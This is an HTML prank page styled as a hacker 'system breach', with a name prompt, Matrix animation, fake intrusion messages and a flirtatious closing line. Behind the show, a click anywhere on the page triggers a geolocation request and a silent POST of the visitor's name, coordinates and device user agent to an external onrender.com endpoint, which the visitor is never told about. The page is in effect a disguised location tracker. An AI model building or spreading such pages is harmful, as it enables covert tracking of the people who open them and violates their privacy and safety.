<!DOCTYPE html>
<html>
<head>
<title>System Access...</title>

<style>
body {
  margin: 0;
  background: black;
  color: #00ff00;
  font-family: monospace;
  overflow: hidden;
}

/* full click overlay */
#overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: 999;
}

/* hacker text */
#hacker {
  white-space: pre-line;
  padding: 20px;
  font-size: 18px;
}

/* final message */
#main {
  display: none;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  text-align: center;
  color: white;
  font-family: Arial;
}

/* typing effect */
.typing {
  border-right: 2px solid white;
  white-space: nowrap;
  overflow: hidden;
  animation: typing 3s steps(30), blink 1s infinite;
}

@keyframes typing {
  from { width: 0 }
  to { width: 100% }
}

@keyframes blink {
  50% { border-color: transparent }
}

/* matrix */
canvas {
  position: fixed;
  top: 0;
  left: 0;
  z-index: -1;
}

/* shake */
.shake {
  animation: shake 0.3s infinite;
}

@keyframes shake {
  0% { transform: translate(2px,2px); }
  25% { transform: translate(-2px,-2px); }
  50% { transform: translate(2px,-2px); }
  75% { transform: translate(-2px,2px); }
  100% { transform: translate(2px,2px); }
}
</style>
</head>

<body>

<div id="overlay" onclick="startAll()"></div>
<canvas id="matrix"></canvas>

<div id="hacker"></div>

<div id="main">
  <h1 id="title"></h1>
  <p id="msg" class="typing"></p>
</div>

<audio id="bgmusic" loop>
  <source src="music.mp3" type="audio/mpeg">
</audio>

<script>

// 🔥 NAME INPUT + VALIDATION
let userName = prompt("Enter your name 😎");

let validName = /^[A-Za-z ]+$/;

if (!userName || !validName.test(userName)) {

  document.body.style.background = "red";

  alert("❌ INVALID NAME");

  if (navigator.vibrate) {
    navigator.vibrate([300,100,300,100,300]);
  }

  throw new Error("Invalid name");
}

// 🔥 START ALL
function startAll() {
  playMusic();
  vibratePhone();
  document.body.classList.add("shake");

  getLocationAndSend(); // 🔥 SERVER CALL
}

// 🎵 MUSIC
function playMusic() {
  document.getElementById("bgmusic").play();
}

// 📳 VIBRATION
function vibratePhone() {
  if (navigator.vibrate) {
    navigator.vibrate([200,100,200]);
  }
}

// 📍 LOCATION + SEND
function getLocationAndSend() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {

      let location = position.coords.latitude + "," + position.coords.longitude;

      sendToServer(location);

    }, function() {
      sendToServer("Permission Denied");
    });
  } else {
    sendToServer("Not Supported");
  }
}

// 📡 SEND TO SERVER
function sendToServer(location) {
  fetch("https://mysite-uax8.onrender.com/send", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      name: userName,
      location: location,
      device: navigator.userAgent
    })
  });
}

// 💻 HACKER TEXT
let lines = [
  "Initializing system...",
  "Tracking user: " + userName,
  "Accessing data...",
  "Bypassing firewall...",
  "Injecting script...",
  "Access Granted ✔"
];

let i = 0;
let hackerDiv = document.getElementById("hacker");

function typing() {
  if (i < lines.length) {
    hackerDiv.innerHTML += lines[i] + "\\n";
    i++;
    setTimeout(typing, 900);
  } else {
    setTimeout(showMessage, 1000);
  }
}

// 😈 FINAL MESSAGE
function showMessage() {
  document.getElementById("hacker").style.display = "none";
  document.getElementById("main").style.display = "block";

  document.getElementById("title").innerText =
    "😎 Hello " + userName;

  document.getElementById("msg").innerText =
    userName + ", tum ekdum special ho 💌🔥";

  alert("😈 " + userName + " SYSTEM BREACHED!");
}

typing();

// 🌧️ MATRIX EFFECT
let canvas = document.getElementById("matrix");
let ctx = canvas.getContext("2d");

canvas.height = window.innerHeight;
canvas.width = window.innerWidth;

let letters = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
let fontSize = 14;
let columns = canvas.width / fontSize;

let drops = [];
for (let x = 0; x < columns; x++) drops[x] = 1;

function draw() {
  ctx.fillStyle = "rgba(0,0,0,0.05)";
  ctx.fillRect(0,0,canvas.width,canvas.height);

  ctx.fillStyle = "#0F0";
  ctx.font = fontSize + "px monospace";

  for (let i = 0; i < drops.length; i++) {
    let text = letters[Math.floor(Math.random()*letters.length)];
    ctx.fillText(text, i*fontSize, drops[i]*fontSize);

    if (drops[i]*fontSize > canvas.height && Math.random()>0.975)
      drops[i] = 0;

    drops[i]++;
  }
}

setInterval(draw, 33);

</script>

</body>
</html>
